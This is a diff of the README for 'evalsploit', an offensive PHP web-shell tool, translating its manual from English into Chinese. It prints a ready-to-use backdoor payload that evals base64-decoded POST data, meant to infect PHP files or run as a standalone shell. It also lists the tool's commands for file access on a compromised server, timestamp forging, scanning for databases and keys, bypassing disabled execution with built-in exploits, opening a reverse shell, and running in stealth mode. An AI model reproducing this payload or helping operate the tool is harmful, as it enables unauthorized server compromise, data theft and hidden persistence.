@@ -18,92 +18,92 @@
     -   有效载荷可添加到PHP代码的任何部分
     -   适用于 Linux, Windows, Mac OS
 
-# Manual
+# 使用手册
 
-#### Getting started
+#### 入门
 
-1) Use the payload to infect PHP or as an independent shell:
+1) 使用有效载荷感染PHP或作为一个独立的外壳
 `if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'], '' ,$_POST['Z'])));die();}`
-3) When starting the program, evalsploit will require a link to the file with the payload
-4) When changing the `send` module (see "program setup"), use the `gen` command to generate a new payload
+2) 当启动程序时，evalsploit将需要链接到含有效负荷的文件
+3) 当更改 `send` 模块（见于“程序设置”）时，使用 `gen` 指令生成新的有效负载
 
-#### Working with the file system
+#### 使用文件系统
 
--   `ls`: list of files in the directory
-	-   Setting `ls`: based on the DirectoryIterator function (stands by default)
-	-   Setting `dir`: based on the ScanDir function
+-   `ls`: 该目录中文件的列表
+	-   设置 `ls`: 基于 DirectoryIterator（默认支持）
+	-   设置 `dir`: 基于 ScanDir
 
--   `cp`: copying files
-    -   Use the separator ` : ` (/what.txt : /where/what.txt )
+-   `cp`: 复制文件
+    -   使用分隔号 ` : ` (/what.txt : /where/what.txt )
 
--   `cd`: moving through the file system
+-   `cd`: 通过文件系统进行移动
 
--	`mkd`: create a new directory
+-	`mkd`: 创建新目录
 
--	`upl`: upload a file to the server
+-	`upl`: 上传文件到服务器
 
--	`home`: back to \_\_DIR\_\_
+-	`home`: 回到 \_\_DIR\_\_
 
--	`pwd`: print the active directory
+-	`pwd`: 打印活动目录
 
-#### Working with files
+#### 使用文件
 
--   `cat`: print the file contents
-    -   Setting `html`: based on the htmlentities function
-	-   Setting `base64`: based on the base64_encode\base64_decode function (set as default)
+-   `cat`: 使用文件
+    -   设置 `html`: 基于 htmlentities 
+	-   设置 `base64`: 基于 base64_encode\base64_decode (设置默认)
 
--   `rm`: delete file
+-   `rm`: 删除文件
 
--   `dl`: download file (to the /download folder)
-	-	Does not work well with files larger than 100 MB
+-   `dl`: 下载文件（下载到/下载文件夹）
+	-	不能处理大于100MB的文件
 	
--   `edit`: edit file contents
-	-	Does not work well with files larger than 100 MB
+-   `edit`: 编辑文件内容
+	-	不能处理大于100MB的文件
 
--	`mkf`: create new file
+-	`mkf`: 创建新文件
 
--	`touch`: change file datestamp
-	-	Use the ` settime ` separator (file.рhр settime Year-Month-Day Hour:Minute:Second)
+-	`touch`: 更改文件时间戳
+	-	使用 ` settime ` 分隔 (file.рhр settime Year-Month-Day Hour:Minute:Second)
 
--	`stat`: file information
+-	`stat`: 文件信息
 
--	`ren`: rename file
-	-	Use the separator ` : ` (/where/old.txt : new.php )
+-	`ren`: 重命名文件
+	-	使用分隔 ` : ` (/where/old.txt : new.php )
 
 
-#### Working with the evalsploit system
+#### 使用evalsploit系统
 
--   `run`: switch to command line mode
-	-	`exit` to exit the mode
-	-	Supports exec, shell_exec, system, passthru, popen, proc_open, expect_popen, pcntl_exec, do
+-   `run`: 切换到命令行模式
+	-	`exit` 退出模式
+	-	支持 exec, shell_exec, system, passthru, popen, proc_open, expect_popen, pcntl_exec, do
 	
--	`info`: server informtion
-	-	php version, OS
+-	`info`: 服务器信息
+	-	php 版本, OS
 	
--	`scan`: scanning the selected directory
-	-	Search for system PHP, databases, keys etc
+-	`scan`: 扫描所选目录
+	-	搜索系统 PHP, 数据库、密钥等
 	
--	`exploit`: bypassing disabled command line with built-in exploits, activates the command line mode
-	-	`exit` to exit the mode
+-	`exploit`: 使用内置漏洞绕过已禁用的命令行，激活命令行模式
+	-	`exit` 退出模式
 
 -	`reverse`: reverse-shell - `reverse IP:PORT`
 	
--	`gen`: generating a payload depending on the send module
+-	`gen`: 根据发送模块生成有效负载
 	
--	`help`: home screen
+-	`help`: 首页
 	
--	`exit`: exit
+-	`exit`: 退出
 	
 	
 	
-#### Program Setup
+#### 程序设置
 
--	`set`: configuring modules. To view the list of parameters use `set module help`
-	-	Instead of `help` acceptable `-h`, `h`, `?`, `/?`)
+-	`set`: 配置模块。要查看参数列表请使用 `set module help`
+	-	代替 `help` 可接受 `-h`, `h`, `?`, `/?`)
 	-	**run**: `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `expect_popen`, `pcntl_exec`, `do`
 	-	**ls**: `ls`, `dir`
 	-	**cat**: `html`, `base64`
-	-	**silent**: `1`, `0` (Stealth)
+	-	**silent**: `1`, `0` (隐身)
 	-	**reverse**: `ivan`, `monkey` 
-	-	**send**: `bypass`, `classic`, `simple` (send mmodule)
+	-	**send**: `bypass`, `classic`, `simple` (发送模块)
 	
